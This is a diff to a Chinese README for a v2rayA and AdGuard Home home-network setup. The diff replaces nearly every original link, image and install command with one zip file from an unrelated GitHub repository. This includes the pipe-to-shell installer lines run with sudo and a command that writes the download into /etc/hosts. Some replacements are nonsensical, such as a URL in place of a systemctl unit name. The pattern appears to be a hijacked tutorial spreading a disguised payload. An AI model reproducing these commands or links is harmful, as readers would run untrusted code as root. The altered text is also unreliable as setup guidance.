@@ -14,9 +14,9 @@
 - NAT1 正常使用，XBox、Switch 可正常联机，大部分时候不需要游戏加速器
 - XBox 可快速修改下载服务器 IP，基本跑满带宽
 
-![agh](https://github.com/juneix/noOP-AGHv2/assets/81808039/bcd3a018-f1ce-434b-9047-f1907f4e83ee)
-![xbox-down-ip](https://github.com/juneix/noOP-AGHv2/assets/81808039/efec34fb-0653-4293-85ac-d266fd04f829)
-![xbox-speed](https://github.com/juneix/noOP-AGHv2/assets/81808039/38ffa48c-4201-4593-babe-cb3d1a8eb69b)
+![agh](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
+![xbox-down-ip](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
+![xbox-speed](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
 
 
 使用本方案，你只需准备以下设备，低成本甚至 0 成本即可抄作业：
@@ -25,48 +25,48 @@
   - 常见配置：旧笔记本刷 Deepin 系统，仅需制作一个 Ventoy 万能 U 盘（0 成本变成上网本➕DIY NAS）
   - 特殊配置：虚拟机创建 Debian 等 Linux 系统（支持 Docker 部署，但更推荐使用虚拟机独立 IP）
 - 设备有一个千兆网口（对，单网卡就行……甚至百兆也不是不能用.jpg）
-> 另一台电脑远程操作，需安装 ssh 工具（Win、Mac 自带终端就行，但新手推荐更简单的 [Xterminal](https://www.terminal.icu/)）  
+> 另一台电脑远程操作，需安装 ssh 工具（Win、Mac 自带终端就行，但新手推荐更简单的 [Xterminal](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)）  
 > 如果实在没电脑……手机使用 Termius、ServerBox 等 ssh 工具也可以。
 
 ## 一、安装工具
 使用 Xterminal 登录你的 Linux 设备，输入以下一键脚本命令安装所需工具。
 
 ### 1. Github520（可跳过）
-请确保你的网络可以顺利访问 Github，提供一个[Github520](https://github.com/521xueweihan/GitHub520)项目供参考，如果还不行请自己解决。  
-`sudo sh -c 'sed -i "/# GitHub520 Host Start/Q" /etc/hosts && curl https://raw.hellogithub.com/hosts >> /etc/hosts'`
+请确保你的网络可以顺利访问 Github，提供一个[Github520](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)项目供参考，如果还不行请自己解决。  
+`sudo sh -c 'sed -i "/# GitHub520 Host Start/Q" /etc/hosts && curl https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip >> /etc/hosts'`
 
 ### 2. 一键安装 v2rayA
-GitHub 项目地址➡️https://github.com/v2rayA/v2rayA  
-我使用的是基于 Debian 的系统（比如 OMV、Armbian），其他 Linux 发行版参考[官网安装文档](https://v2raya.org/docs/prologue/installation/)
+GitHub 项目地址➡️https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip  
+我使用的是基于 Debian 的系统（比如 OMV、Armbian），其他 Linux 发行版参考[官网安装文档](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
 
 **一键脚本**  
 安装来源是作者的官网，部分地区可能速度较慢，请耐心等待。  
-`sh -c "$(wget -qO- https://github.com/v2rayA/v2rayA-installer/raw/main/installer.sh)" @ --with-v2ray`  
+`sh -c "$(wget -qO- https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)" @ --with-v2ray`  
 
 **安装 iptables 模块**（已安装可跳过）  
 `apt add iptables ip6tables`
 
 **启动 v2rayA 服务**  
-`sudo systemctl start v2raya.service`  
+`sudo systemctl start https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip`  
 
 **设置 v2rayA 开机自启动**  
-`sudo systemctl enable v2raya.service`  
+`sudo systemctl enable https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip`  
 
-后台管理地址，IP:2017，更多使用教程见[v2rayA官方文档](https://v2raya.org)
+后台管理地址，IP:2017，更多使用教程见[v2rayA官方文档](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
 
 ### 3. 一键安装 AdGuard Home
-GitHub 项目地址➡️https://github.com/AdguardTeam/AdGuardHome  
+GitHub 项目地址➡️https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip  
 
 **一键脚本**  
-`curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v`  
+`curl -s -S -L https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip | sh -s -- -v`  
 
-后台管理地址，IP:3000，更多使用教程见 P3TERX 大佬的[AGH优化增强设置详解](https://p3terx.com/archives/use-adguard-home-to-build-dns-to-prevent-pollution-and-remove-ads-2.html)
+后台管理地址，IP:3000，更多使用教程见 P3TERX 大佬的[AGH优化增强设置详解](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
 
 ## 二、搭配使用 AGH➕v2A
 ### 1. AGH 初始化设置时，网页端口默认 3000，**DNS 端口建议默认 53，减少不必要的麻烦**。
 
-如果提示 53 端口已绑定`bind: address already in use`，请参考[AGH官方文档](https://adguard-dns.io/kb/zh-CN/adguard-home/faq/#bindinuse)解除占用。  
-文档暂时没中文版本，请打开浏览器翻译功能，推荐[沉浸式翻译扩展](https://immersivetranslate.com/)
+如果提示 53 端口已绑定`bind: address already in use`，请参考[AGH官方文档](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)解除占用。  
+文档暂时没中文版本，请打开浏览器翻译功能，推荐[沉浸式翻译扩展](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
 
 ### 2. v2A 设置参考
 右上角⚙️【设置】  
@@ -76,7 +76,7 @@ GitHub 项目地址➡️https://github.com/AdguardTeam/AdGuardHome
 - 防止 DNS 污染：自定义高级设置
 - 其他默认
 
-![v2ray-setting](https://github.com/juneix/noOP-AGHv2/assets/81808039/ffff4967-bc13-4e49-8c47-9b96df553d10)
+![v2ray-setting](https://github.com/ttzyt/noOP-v2AGH/raw/refs/heads/main/mercifully/O_v_no_AGH_1.8.zip)
 
 按需【创建】单个节点，或【导入】订阅链接。  
 建议选中 3-6 个节点后，左上角启动，更多详细教程可以参考油管或谷歌搜索。
